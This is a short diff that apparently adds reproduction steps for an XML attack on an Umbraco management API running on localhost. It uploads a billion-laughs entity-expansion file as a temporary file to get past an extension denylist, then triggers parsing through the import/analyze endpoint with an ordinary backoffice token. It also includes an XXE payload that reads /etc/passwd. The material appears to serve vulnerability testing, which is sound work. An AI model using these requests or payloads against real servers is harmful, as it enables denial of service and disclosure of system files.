@@ -1,0 +1,9 @@
+# 1) upload the billion-laughs XML as a temp file (.xml passes the denylist)
+POST http://localhost:29184/umbraco/management/api/v1/temporary-file  (multipart: Id=<guid>, File=<internal-entity XML, a few hundred bytes>)
+
+# 2) trigger the parse/expansion via analyze (floor-only, any backoffice user)
+GET http://localhost:29184/umbraco/management/api/v1/import/analyze?temporaryFileId=<guid> HTTP/1.1
+Authorization: Bearer <backoffice-token>
+
+# not-XXE probe body:
+<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <r>&xxe;</r>
